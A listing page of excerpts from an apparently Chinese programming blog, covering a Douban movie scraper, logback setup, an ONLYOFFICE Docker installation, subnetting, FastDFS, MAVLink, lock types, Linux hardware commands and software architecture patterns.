self.base_url = 'https://movie.douban.com/j/chart/top_list?type={}&amp;interval_id=100:90&amp;action=&amp;start={}&amp;limit={}' 代码实现 import urllib.request import json # 某瓣电影排行信息抓取 class DouBan(object): # 构造器 # 参数1：页码，参数2：每页显示条数， 参数2：电影类型： 6 为情色 def __init__(self, page_no, page_size, type): self.base_url = 'https://movie.douban.com/j/chart/top_list?type={}&amp;interval_id=100:90&amp;action=&amp;start={}&amp;limit={}' self.headers={ 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36' } self.urls = [self.base_url.format(type, i * page_size, page_size ) for i in range(page_no)] # 获取内容 def get_content(self, url): request = urllib.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f1f7f291eac8f7293844f778b4284665/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa85e6c9d85b682f479857abc44d41e0/" rel="bookmark">
			JavaSE --- 日志框架
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.概述 程序中的日志可以用来记录程序运行过程中的信息，可以永久保存
它可以将系统执行的信息下选择性的记录到指定位置（控制台，文件中，数据库里）
可以随时以开关的形式控制是否记录日志，无需修改代码
2.体系 3.logback日志框架 可以通过官网直接了解该框架技术
logback官网：
Logback Home
slf4j官网
SLF4J
其可分为三个模块：
logback-core: logback-core 模块为其他两个模块奠定了基础，必须有。logback-classic: 它是log4j的一个改良版本，同时它完整实现了slf4jAPl。logback-access 模块与Tomcat 和Jetty等 Servlet 容器集成，以提供 HTTP 访向日志功能 4.logback快速入门 分析：
1.首先需要在项目中新建一个文件夹命名为lib（你也命名为其他），导入Logback的相关jar包到该文件夹下，并添加到项目依赖中
下载以下三个包
复制到idea中
添加依赖
在弹出的对话框中选择ok
2.将logback的核心配置文件logback.xml直接拷贝到src目录下（必须src下），可以去网上下载一搜差不多都有，嘿嘿
logback.xml内容
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;configuration debug="false"&gt; &lt;!-- Where are log files --&gt; &lt;property name="LOG_HOME" value="./" /&gt; &lt;!-- 配置输出到控制台 --&gt; &lt;appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;encoder class="ch.qos.logback.classic.encoder.PatternLayoutEncoder"&gt; &lt;!--%d:date，%thread:thread，%-5level：error/debug/info... %msg：message，%n:new line --&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} - %msg%n&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!-- 配置输出到文件中 --&gt; &lt;appender name="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa85e6c9d85b682f479857abc44d41e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0330c69c568268a76b54c051cd60a77b/" rel="bookmark">
			Android Studio旧版本下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Android Studio 下载文件归档
因为版本不一样导致了各种错，记录一下Android Studio旧版本下载路径
Android Studio 下载文件归档 | Android 开发者 | Android Developers
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bbaac90bd3819519fdfcab0f23f8bca6/" rel="bookmark">
			onlyoffice集成实现编辑预览
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、使用docker方式进行安装1. 系统要求2.安装docker3.安装onlyoffice文件服务器 二、页面集成1.使用vue3进行集成安装依赖使用组件 2.html集成 三、回调Demo总结 前言 ONLYOFFICE 文档开发者版ONLYOFFICE Docs 是一款功能强大的在线编辑器，适用于文本文档、电子表格、演示文稿和表格。创建复杂的文档、专业的电子表格和令人惊叹的演示文稿。支持的常用 Office 和文档格式：docx、xlsx、pptx、odt、ods、odp、doc、xls、ppt、pdf、txt、rtf、html、epub、csv。完全兼容 OOXML(Office Open XML)格式。使您的用户能够在您自己的应用程序中在浏览器中在线编辑、共享和协作处理文档。
OnlyOffice官网地址
版本说明
社区版（免费，最高20个可同时连接，推荐最高20个用户数）企业版（付费，根据价格可选择用户数）开发者版（付费，根据价格可选择用户数） 点我查看版本对比，主要区别如下：
本文是基于社区版进行开发集成
一、使用docker方式进行安装 官方文档地址
1. 系统要求 中央处理器 双核2 GHz或更高内存 4 GB或更多硬盘 至少40 GB的可用空间交换 至少4 GB，但取决于主机操作系统。越多越好操作系统 内核版本为3.10或更高版本的amd64 Linux 发行版其他要求 Docker：Docker 团队支持的任何版本 2.安装docker 如果已经安装忽略此步骤
# 关闭防火墙 systemctl stop firewalld systemctl disable firewalld # 关闭selinux sed -i 's/enforcing/disabled/' /etc/selinux/config # 永久 setenforce 0 # 临时 # 关闭swap swapoff -a # 临时 sed -ri 's/.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bbaac90bd3819519fdfcab0f23f8bca6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/337267b3352c361b37002c559163ed5b/" rel="bookmark">
			子网划分类型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		子网类型：
A类：0~126， 默认子网掩码：255.0.0.0
B类：128~191 ，默认子网掩码：255.255.0.0
C类：192~223 ，默认子网掩码：255.255.255.0
子网地址：网络号（照抄）+子网号（照抄）+主机号（全为0）
广播地址：网络号（照抄）+子网号（照抄）+主机号（全为1）
子网掩码：网络号（全为1）+子网号（全为1）+主机号（全为0）
IP地址总数：根据主机号的位数得出
可分配IP地址总数：主机数（IP地址总数-2）（减去全0和全1的 分别是子网地址和广播地址）
可分配IP地址范围：（子网地址~广播地址）
相与运算:全1为1，其余都0
子网地址=IP地址和子网掩码相与运算
求最小地址与最大地址：
网络号（最小地址）=子网地址（照抄）+主机号（全部变为0）
广播地址（最大地址）=子网地址（照抄）+主机号（全部变为1）
主机号=IP地址-网络地址
最后一个主机地址=直接广播地址最后一个字节-1
第一个主机地址=网络地址最后一位+1
2^7
2^6 2^5 2^4 2^3 2^2 2^1 2^0128 6432168421 某A类网络20.0.0.0的子网掩码为255.224.0.0,请确定可以划分的子网个数，写出每个子网的子网号。
分析 A类网络默认子网掩码：255.0.0.0 由题可知，第二个字节的子网掩码为224，即11100000，所以该A类网络用第二个字节的3个比特进行子网划分。
所以划分的子网数为2^3=8个（就是数二进制有几个1）
子网号由全0到全1 000 001 010 011 100 101 110 111
8个子网的子网号分别为： 20.000 00000.0.0 即20.0.0.0 20.001 00000.0.0 即20.32.0.0 20.010 00000.0.0 即20.64.0.0 20.011 00000.0.0 即20.96.0.0 20.100 00000.0.0 即20.128.0.0 20.101 00000.0.0 即20.160.0.0 20.110 00000.0.0 即20.192.0.0 20.111 00000.0.0 即20.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/337267b3352c361b37002c559163ed5b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/19c731d9d569fc6863de6ab9ec136ca5/" rel="bookmark">
			FastDFS
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1 FastDFS概术2 FastDFS 文件上传过程3 FastDFS下载过程4 MinIO 与 FastDFS 对比 1 FastDFS概术 FastDFS是一个开源的轻量级分布式文件系统，它对文件进行管理，功能包括：文件存储、文件同步、文件访问（文件上传、文件下载）等，解决了大容量存储和负载均衡的问题。
FastDFS服务端有两个角色：跟踪器（tracker）和存储节点（storage）。
跟踪器（tracker）主要做调度工作，在访问上起负载均衡的作用。存储节点（storage）存储文件，完成文件管理的所有功能。 术语：
group：组，同组节点提供冗余备份，不同组用于扩容。mata data：文件的元数据信息，比如长宽信息，图片后缀，视频的帧数等。 2 FastDFS 文件上传过程 Storage会定时的向Tracker发送心跳，告诉Tracker自己还还活着。客户端发送上传请求给Tracker，Tracker会检查是否有可用Storage。如果有可用的，客户端就可以上传文件数据到Storage上。Storage将文件写入磁盘后，会返回路径信息给客户端。客户端就可以根据这个路径信息找到上传的文件。 3 FastDFS下载过程 Storage会定时的向Tracker安装发送心跳，告诉Tracker自己还还活着。客户端发送下载请求到Tracker上，Tracker查找到存储的Storage地址后返回给客户端。客户端拿到Storage地址后，去Storage上找到文件。把文件返回给客户端。 4 MinIO 与 FastDFS 对比 安装部署(运维) FastDFS安装部署(运维)复杂。MinIO在安装的过程是黑盒的，你不用去深入关注它的架构，也不需要你进行零件组装，基本上可以做到开箱即用。普通的技术人员就能够参与后期运维。 文档 FastDFS没有官方文档MinIO有官方网站，并且有详细的文档 开源项目运营组织 FastDFS是阿里余庆做的一个个人项目，在一些互联网创业公司中有应用，没有官网，不活跃。目前已经很少做更新。MinIO目前是由2014年在硅谷创立的公司MinIO.Inc运营的开源项目，社区论坛的活跃度目前也非常的不错。 UI界面 FastDFS默认是不带UI界面的。MinIO的界面不需要你单独的部署，和服务端一并安装，开箱即用。 性能 MinIO号称是世界上速度最快的对象存储服务器。在标准硬件上，对象存储的读/写速度最高可以达到183 GB/s和171 GB/s。FastDFS很难达到MinIO“号称的”以G为单位的每秒读写速度。 容器化支持 MinIO提供了与k8s、etcd、docker等容器化技术深度集成方案，可以说就是为了云环境而生的。FastDFS不具备。 丰富的SDK支持 FastDFS目前提供了 C 和 Java SDK，以及 PHP 扩展 SDK。MinIO几乎提供了所有主流开发语言的SDK以及文档。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3baf9a2019b7e1cfb5ad2cb2ddc8fd69/" rel="bookmark">
			【无人机开发】通讯协议MavLink详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. MAVLink简介 MAVLink（Micro Air Vehicle Link，微型空中飞行器链路通讯协议）是无人飞行器与地面站（Ground Control Station ，GCS）之间通讯，以及无人飞行器之间通讯最常用的协议。它已经在PX4、APM、PIXHAWK和Parrot AR.Drone飞控平台上进行了大量测试。
2.发明者Lorenz Meier简介 MAVLink的最初开发于2009年，由Lorenz Meier完成。Lorenz Meier的LinkedIn主页是：https://www.linkedin.com/in/meierlorenz，个人主页是：https://www.inf.ethz.ch/personal/lomeier/。 根据官网和个人主页，Lorenz Meie的个人经历如下：  2004年~2008年在德国康斯坦茨大学（Universität Konstanz）就读信息工程专业；  2008 年~2011年在苏黎世联邦理工学院（德语：Eidgenössische Technische Hochschule Zürich，简称 ETH Zürich或ETHZ）就读视觉计算方向研究生；  2011~至今在ETHZ攻读博士后，研究方向是：Research on Drones and mobile phones focused on obstacle mapping, path planning and control.  2011年到现在，Lorenz Meier一直是开源无人机项目Autopilot的建立者和维护者。关于Autopilot，我会另辟章节介绍。 从介绍来看，Lorenz Meier的研究方向包括了无人机避障、基于智能手机或无人机的3D重建、无人机通讯协议等有趣又前言的内容。 这个页面是Lorenz Meier发表的几篇文章：https://www.researchgate.net/profile/Lorenz_Meier3
3. MAVLink相关资料 维基百科：https://en.wikipedia.org/wiki/MAVLink MavLink官方网站：http://qgroundcontrol.org/mavlink/start Python写的用于生成C、Java等语言的MavLink生成器软件：https://github.com/mavlink/mavlink
4.协议构成 下面内容引自官网。 • The checksum is the same as used in ITU X.25 and SAE AS-4 standards (CRC-16-CCITT), documented in SAE AS5669A.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3baf9a2019b7e1cfb5ad2cb2ddc8fd69/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0af0211e0978c5fc95312e867d1edb55/" rel="bookmark">
			arcmap坐标系转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		arcmap坐标系转换 arcmap坐标系转换 arcmap坐标系转换 指定坐标系转换：
已知坐标系的转换：
转换方法如下：
转换成功成果展示：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e2de98e1ff75cc1a619781ca780cba6/" rel="bookmark">
			锁的概念（互斥锁、读写锁、条件锁、自旋锁、）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		生活中用到的锁，用途都比较简单粗暴，上锁基本是为了防止外人进来、电动车被偷等等。
但生活中也不是没有 BUG 的，比如加锁的电动车在「广西 - 窃·格瓦拉」面前，锁就是形同虚设，只要他愿意，他就可以轻轻松松地把你电动车给「顺走」，不然打工怎么会是他这辈子不可能的事情呢？牛逼之人，必有牛逼之处。
那在编程世界里，「锁」更是五花八门，多种多样，每种锁的加锁开销以及应用场景也可能会不同。
如何用好锁，也是程序员的基本素养之一了。
高并发的场景下，如果选对了合适的锁，则会大大提高系统的性能，否则性能会降低。
所以，知道各种锁的开销，以及应用场景是很有必要的。
接下来，就谈一谈常见的这几种锁：
先看看互斥锁，它只有两个状态，要么是加锁状态，要么是不加锁状态。假如现在一个线程a只是想读一个共享变量 i，因为不确定是否会有线程去写它，所以我们还是要对它进行加锁。但是这时又有一个线程b试图去读共享变量 i，发现被锁定了，那么b不得不等到a释放了锁后才能获得锁并读取 i 的值，但是两个读取操作即使是同时发生的，也并不会像写操作那样造成竞争，因为它们不修改变量的值。所以我们期望在多个线程试图读取共享变量的时候，它们可以立刻获取因为读而加的锁，而不是需要等待前一个线程释放。
读写锁可以解决上面的问题。它提供了比互斥锁更好的并行性。因为以读模式加锁后，当有多个线程试图再以读模式加锁时，并不会造成这些线程阻塞在等待锁的释放上。
读写锁是多线程同步的另外一个机制。在一些程序中存在读操作和写操作问题，对某些资源的访问会存在两种可能情况，一种情况是访问必须是排他的，就是独占的意思，这种操作称作写操作，另外一种情况是访问方式是可以共享的，就是可以有多个线程同时去访问某个资源，这种操作称为读操作。这个问题模型是从对文件的读写操作中引申出来的。把对资源的访问细分为读和写两种操作模式，这样可以大大增加并发效率。读写锁比互斥锁适用性更高，并行性也更高。
需要注意的是，这里只是说并行效率比互斥高，并不是速度一定比互斥锁快，读写锁更复杂，系统开销更大。并发性好对于用户体验非常重要，假设互斥锁需要0.5秒，使用读写锁需要0.8秒，在类似学生管理系统的软件中，可能90%的操作都是查询操作。如果突然有20个查询请求，使用的是互斥锁，则最后的查询请求被满足需要10秒，估计没人接收。使用读写锁时，因为读锁能多次获得，所以20个请求中，每个请求都能在1秒左右被满足，用户体验好的多。
自旋锁（spinlock）：是指当一个线程在获取锁的时候，如果锁已经被其它线程获取，那么该线程将循环等待，然后不断的判断锁是否能够被成功获取，直到获取到锁才会退出循环。
获取锁的线程一直处于活跃状态，但是并没有执行任何有效的任务，使用这种锁会造成busy-waiting。
二 读写锁特点
1 如果一个线程用读锁锁定了临界区，那么其他线程也可以用读锁来进入临界区，这样可以有多个线程并行操作。这个时候如果再用写锁加锁就会发生阻塞。写锁请求阻塞后，后面继续有读锁来请求时，这些后来的读锁都将会被阻塞。这样避免读锁长期占有资源，防止写锁饥饿。
2 如果一个线程用写锁锁住了临界区，那么其他线程无论是读锁还是写锁都会发生阻塞。
自旋锁的优点 自旋锁不会使线程状态发生切换，一直处于用户态，即线程一直都是active的；不会使线程进入阻塞状态，减少了不必要的上下文切换，执行速度快
非自旋锁在获取不到锁的时候会进入阻塞状态，从而进入内核态，当获取到锁的时候需要从内核态恢复，需要线程上下文切换。 （线程被阻塞后便进入内核（Linux）调度状态，这个会导致系统在用户态与内核态之间来回切换，严重影响锁的性能）
可重入的自旋锁和不可重入的自旋锁
锁支不支持重入的，即当一个线程第一次已经获取到了该锁，在锁释放之前又一次重新获取该锁，第二次就不能成功获取到。由于不满足CAS，所以第二次获取会进入while循环等待，而如果是可重入锁，第二次也是应该能够成功获取到的。
而且，即使第二次能够成功获取，那么当第一次释放锁的时候，第二次获取到的锁也会被释放，而这是不合理的。
为了实现可重入锁，我们需要引入一个计数器，用来记录获取锁的线程数。
链接：https://www.jianshu.com/p/9d3660ad4358
三 读写锁使用的函数
操作
相关函数说明
初始化读写锁
pthread_rwlock_init 语法
读取读写锁中的锁
pthread_rwlock_rdlock 语法
读取非阻塞读写锁中的锁
pthread_rwlock_tryrdlock 语法
写入读写锁中的锁
pthread_rwlock_wrlock 语法
写入非阻塞读写锁中的锁
pthread_rwlock_trywrlock 语法
解除锁定读写锁
pthread_rwlock_unlock 语法
销毁读写锁
pthread_rwlock_destroy 语法
读写锁是用来解决读者写者问题的，读操作可以共享，写操作是排他的，读可以有多个在读，写只有唯一个在写，同时写的时候不允许读。
具有强读者同步和强写者同步两种形式
强读者同步：当写者没有进行写操作，读者就可以访问；
强写者同步：当所有写者都写完之后，才能进行读操作，读者需要最新的信息，一些事实性较高的系统可能会用到该所，比如定票之类的。
读写锁的操作：
读写锁的初始化：
定义读写锁： pthread_rwlock_t m_rw_lock;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4e2de98e1ff75cc1a619781ca780cba6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a1194f6907734262faa23818b62bec7/" rel="bookmark">
			Linux（查看服务cpu核数和内存）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		linux服务器中最重要的两个配置是CPU和内存。那么怎么开始查看CPU核数和内存，以及使用情况，是日常运维中使用最多的操作。
查看linux服务器cpu最简单的命令是 cat /proc/cpuinfo
查看linux服务器cpu最简单的命令是 lscpu
查看linux服务器内存
cat /proc/meminfo
查看linux服务器内存最简单的命令： free -h
lscpu信息
[root@tXX-XXX-app logs]# lscpu Architecture: x86_64 CPU op-mode(s): 32-bit, 64-bit Byte Order: Little Endian CPU(s): 4 On-line CPU(s) list: 0-3 Thread(s) per core: 1 Core(s) per socket: 4 Socket(s): 1 NUMA node(s): 1 Vendor ID: GenuineIntel CPU family: 6 Model: 85 Model name: Intel(R) Xeon(R) Platinum 8255C CPU @ 2.50GHz Stepping: 5 CPU MHz: 2494.140 BogoMIPS: 4988.28 Hypervisor vendor: KVM Virtualization type: full L1d cache: 32K L1i cache: 32K L2 cache: 4096K L3 cache: 36608K NUMA node0 CPU(s): 0-3 可以看出操作系统的架构是x86 64位的操作系统。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9a1194f6907734262faa23818b62bec7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15b0eb854967e9864b6debf8181090b2/" rel="bookmark">
			几种常见的架构模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文已经收录到Github仓库，该仓库包含计算机基础、Java基础、多线程、JVM、数据库、Redis、Spring、Mybatis、SpringMVC、SpringBoot、分布式、微服务、设计模式、架构、校招社招分享等核心知识点，欢迎star~
Github地址
如果访问不了Github，可以访问gitee地址。
gitee地址
分享一些工作中会用到的一些架构方面的设计模式。总体而言，共有八种，分别是：
单库单应用模式：最简单的，可能大家都见过内容分发模式：目前用的比较多查询分离模式：对于大并发的查询、业务微服务模式：适用于复杂的业务模式的拆解多级缓存模式：可以把缓存玩的很好分库分表模式：解决单机数据库瓶颈弹性伸缩模式：解决波峰波谷业务流量不均匀的方法之一多机房模式：解决高可用、高性能的一种方法 三、单库单应用模式 这是最简单的一种设计模式，我们的大部分本科毕业设计、一些小的应用，基本上都是这种模式，这种模式的一般设计见下图：
最全面的Java面试网站
如上图所示，这种模式一般只有一个数据库，一个业务应用层，一个后台管理系统，所有的业务都是用过业务层完成的，所有的数据也都是存储在一个数据库中的，好一点会有数据库的同步。虽然简单，但是也并不是一无是处。
优点：结构简单、开发速度快、实现简单，可用于产品的第一版等有原型验证需求、用户少的设计。缺点：性能差、基本没有高可用、扩展性差，不适用于大规模部署、应用等生产环境。 四、内容分发模式 基本上所有的大型的网站都有或多或少的采用这一种设计模式，常见的应用场景是使用CDN技术把网页、图片、CSS、JS等这些静态资源分发到离用户最近的服务器。这种模式的一般设计见下图：
如上图所示，这种模式较单库单应用模式多了一个CDN、一个云存储OSS(七牛、又拍等雷同)。一个典型的应用流程(以用户上传、查看图片需求为例)如下：
上传的时候，用户选择本地机器上的一个图片进行上传程序会把这个图片上传到云存储OSS上，并返回该图片的一个URL程序把这个URL字符串存储在业务数据库中，上传完成。查看的时候，程序从业务数据库得到该图片的URL程序通过DNS查询这个URL的图片服务器智能DNS会解析这个URL，得到与用户最近的服务器(或集群)的地址A然后把服务器A上的图片返回给程序程序显示该图片，查看完成。 由上可知，这个模式的关键是智能DNS，它能够解析出离用户最近的服务器。运行原理大致是：根据请求者的IP得到请求地点B，然后通过计算或者配置得到与B最近或通讯时间最短的服务器C，然后把C的IP地址返回给请求者。这种模式的优缺点如下：
优点：资源下载快、无需过多的开发与配置，同时也减轻了后端服务器对资源的存储压力，减少带宽的使用。缺点：目前来说OSS，CDN的价格还是稍微有些贵(虽然已经降价好几次了)，只适用于中小规模的应用，另外由于网络传输的延迟、CDN的同步策略等，会有一些一致性、更新慢方面的问题。 五、查询分离模式 这种模式主要解决单机数据库压力过大，从而导致业务缓慢甚至超时，查询响应时间变长的问题，也包括需要大量数据库服务器计算资源的查询请求。这个可以说是单库单应用模式的升级版本，也是技术架构迭代演进过程中的必经之路。 这种模式的一般设计见下图：
如上图所示，这种模式较单库单应用模式与内容分发模式多了几个部分，一个是业务数据库的主从分离，一个是引入了ES，为什么要这样？都解决了哪些痛点，下面具体结合业务需求场景进行叙述。
场景一：全文关键词检索
我想这个需求，绝大多数应用都会有，如果使用传统的数据库技术，大部分可能都会使用like这种SQL语句，高级一点可能是先分词，然后通过分词index相关的记录。SQL语句的性能问题与全表扫描机制导致了非常严重的性能问题，现在基本上很少见到。 这里的ES是ElasticSearch的缩写，是一种查询引擎，类似的还有Solr等，都差不多的技术，ES较Solr配置简单、使用方便，所以这里选用了它。另外，ES支持横向扩展，理论上没有性能的瓶颈。同时，还支持各种插件、自定义分词器等，可扩展性较强。在这里，使用ES不仅可以替代数据库完成全文检索功能，还可以实现诸如分页、排序、分组、分面等功能。具体的，请同学们自行学习之。那怎么使用呢？一个一般的流程是这样的：
服务端把一条业务数据落库服务端异步把该条数据发送到ESES把该条记录按照规则、配置放入自己的索引库客户端查询的时候，由服务端把这个请求发送到ES，得到数据后，根据需求拼装、组合数据，返回给客户端 实际中怎么用，还请同学们根据实际情况做组合、取舍。
场景二：大量的普通查询
这个场景是指我们的业务中的大部分辅助性的查询，如：取钱的时候先查询一下余额，根据用户的ID查询用户的记录，取得该用户最新的一条取钱记录等。我们肯定是要天天要用的，而且用的还非常多。同时呢，我们的写入请求也是非常多的，导致大量的写入、查询操作压向同一数据库，然后，数据库挂了，系统挂了，领导生气了，被开除了，还不起房贷了，露宿街头了，老婆跟别人跑了，…
不敢想，所以要求我们必须分散数据库的压力，一个业界较成熟的方案就是数据库的读写分离，写的时候入主库，读的时候读从库。这样就把压力分散到不同的数据库了，如果一个读库性能不行，扛不住的话，可以一主多从，横向扩展。可谓是一剂良药啊！那怎么使用呢？一个一般的流程是这样的：
服务端把一条业务数据落库数据库同步或异步或半同步把该条数据复制到从库服务端读数据的时候直接去从库读相应的数据 比较简单吧，一些聪明的、爱思考的、上进的同学可能发现问题了，也包括上面介绍的场景一，就是延迟问题，如：数据还没有到从库，我就马上读，那么是读不到的，会发生问题的。 对于这个问题，各家公司解决的思路不一样，方法不尽相同。一个普遍的解决方案是：读不到就读主库，当然这么说也是有前提条件的，但具体的方案这里就不一一展开了，我可能会在接下来的分享中详解各种方案。 另外，关于数据库的复制模式，还请同学们自行学习，太多了，这里说不清。该总结一下这种模式的优缺点的了，如下：
优点：减少数据库的压力，理论上提供无限高的读性能，间接提高业务(写)的性能，专用的查询、索引、全文(分词)解决方案。缺点：数据延迟，数据一致性的保证。 六、微服务模式 上面的模式看似不错，解决了性能问题，我可以不用露宿街头了、老婆还是我的，哈哈。但是
软件系统天生的复杂性决定了，除了性能，还有其他诸如高可用、健壮性等大量问题等待我们解决，再加上各个部门间的撕逼、扯皮，更让我们码农雪上加霜，所以
继续吧…
微服务模式可以说是最近的热点，花花绿绿、大大小小、国内国外的公司都在鼓吹，实践这个模式，可是大部分都没有弄清楚为什么要这么做，也并不知道这么做有什么好处、坏处，在这里，我将以我自己的亲身实践说一下我对这个模式的看法，不喜勿喷！随着业务与人员的增加，遇到了如下的问题：
单机数据库写请求量大量增加，导致数据库压力变大数据库一旦挂了，那么整个业务都挂了业务代码越来越多，都在一个GIT里，越来越难以维护代码腐化严重、臭味越来越浓上线越来越频繁，经常是一个小功能的修改，就要整个大项目要重新编译部门越来越多，该哪个部门改动大项目中的哪个东西，撕逼的厉害其他一些外围系统直接连接数据库，导致一旦数据库结构发生变化，所有的相关系统都要通知，甚至对修改不敏感的系统也要通知每个应用服务器需要开通所有的权限、网络、FTP、各种各样的，因为每个服务器部署的应用都是一样的作为架构师，我已经失去了对这个系统的把控… 为了解决上述问题，我司使用了微服务模式，这种模式的一般设计见下图：
如上图所示，我把业务分块，做了垂直切分，切成一个个独立的系统，每个系统各自衍化，有自己的库、缓存、ES等辅助系统，系统之间的实时交互通过RPC，异步交互通过MQ，通过这种组合，共同完成整个系统功能。 那么，这么做是否真的解决上述问题了呢？不玩虚的，一个个来说。对于问题一，由于拆分成了多个子系统，系统的压力被分散了，而各个子系统都有自己的数据库实例，所以数据库的压力变小。
对于问题二，一个子系统A的数据库挂了，只是影响到系统A和使用系统A的那些功能，不会所有的功能不可用，从而解决一个数据库挂了，导致所有功能不可用的问题。
问题三、四，也因为拆分得到了解决，各个子系统有自己独立的GIT代码库，不会相互影响。通用的模块可通过库、服务、平台的形式解决。
问题五，子系统A发生改变，需要上线，那么我只需要编译A，然后上线就可以了，不需要其他系统做同样的事情。
问题六，顺应了康威定律，我部门该干什么事、输出什么，也通过服务的形式暴露出来，我部只管把我部的职责、软件功能做好就可以。
问题七，所有需要我部数据的需求，都通过接口的形式发布出去，客户通过接口获取数据，从而屏蔽了底层数据库结构，甚至数据来源，我部只需保证我部的接口契约没有发生变化即可，新的需求增加新的接口，不会影响老的接口。
问题八，不同的子系统需要不同的权限，这个问题也优雅的解决了。
问题九，暂时控制住了复杂性，我只需控制好大的方面，定义好系统边界、接口、大的流程，然后再分而治之、逐个击破、合纵连横。
目前来说，所有问题得到解决！bingo! 但是，还有许多其他的副作用会随之产生，如RPC、MQ的超高稳定性、超高性能，网络延迟，数据一致性等问题，这里就不展开来讲了，太多了，一本书都讲不完。
另外，对于这个模式来说，最难把握的是度，切记不要切分过细，我见过一个功能一个子系统，上百个方法分成上百个子系统的，真的是太过度了。实践中，一个较为可行的方法是：能不分就不分，除非有非常必要的理由！。
优点：相对高性能，可扩展性强，高可用，适合于中等以上规模公司架构。缺点：复杂、度不好把握。指不仅需要一个能在高层把控大方向、大流程、总体技术的人，还需要能够针对各个子系统有针对性的开发。把握不好度或者滥用的话，这个模式适得其反！ 七、多级缓存模式 这个模式可以说是应对超高查询压力的一种普遍采用的策略，基本的思想就是在所有链路的地方，能加缓存就加缓存，如下图所示：
最全面的Java面试网站
如上图所示，一般在三个地方加入缓存，一个是客户端处，一个是API网关处，一个是具体的后端业务处，下面分别介绍。
客户端处缓存：这个地方加缓存可以说是效果最好的—无延迟。因为不用经过长长的网络链条去后端业务处获取数据，从而导致加载时间过长，客户流失等损失。虽然有CDN的支持，但是从客户端到CDN还是有网络延迟的，虽然不大。具体的技术依据不同的客户端而定，对于WEB来讲，有浏览器本地缓存、Cookie、Storage、缓存策略等技术；对于APP来讲，有本地数据库、本地文件、本地内存、进程内缓存支持。以上提到的各种技术有兴趣的同学可以继续展开来学习。如果客户端缓存没有命中，那么就会去后端业务拿数据，一般来讲，都会有个API网关，在这里加缓存也是非常有必要的。
API网关处缓存：这个地方加缓存的好处是不用把请求发送到后方，直接在这里就处理了，然后返回给请求者。常见的技术，如http请求，API网关用的基本都是nginx，可以使用nginx本身的缓存模块，也可以使用Lua+Redis技术定制化。其他的也都大同小异。
后端业务处：这个我想就不用多说了，大家应该差不多都知道，什么Redis,Memcache,Jvm内等等，不熬述了。
实践中，要结合具体的实际情况，综合利用各级缓存技术，使得各种请求最大程度的在到达后端业务之前就被解决掉，从而减少后端服务压力、减少占用带宽、增强用户体验。至于是否只有这三个地方加缓存，我觉得要活学活用，**心法比剑法重要！**总结一下这个模式的优缺点：
优点：抗住大量读请求，减少后端压力。缺点：数据一致性问题较突出，容易发生雪崩，即：如果客户端缓存失效、API网关缓存失效，那么所有的大量请求瞬间压向后端业务系统，后果可想而知。 八、分库分表模式 这种模式主要解决单表写入、读取、存储压力过大，从而导致业务缓慢甚至超时，交易失败，容量不够的问题。一般有水平切分和垂直切分两种，这里主要介绍水平切分。这个模式也是技术架构迭代演进过程中的必经之路。 这种模式的一般设计见下图：
如上图所示红色部分，把一张表分到了几个不同的库中，从而分担压力。是不是很笼统？哈哈，那我们接下来就详细的讲解一下。首先澄清几个概念，如下： 主机：硬件，指一台物理机，或者虚拟机，有自己的CPU，内存，硬盘等。 实例：数据库实例，如一个MySQL服务进程。一个主机可以有多个实例，不同的实例有不同的进程，监听不同的端口。 库：指表的集合，如学校库，可能包含教师表、学生表、食堂表等等，这些表在一个库中。一个实例中可以有多个库。库与库之间用库名来区分。 表：库中的表，不必多说，不懂的就不用往下看了，不解释。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/15b0eb854967e9864b6debf8181090b2/">Read more…</a>
	</div>
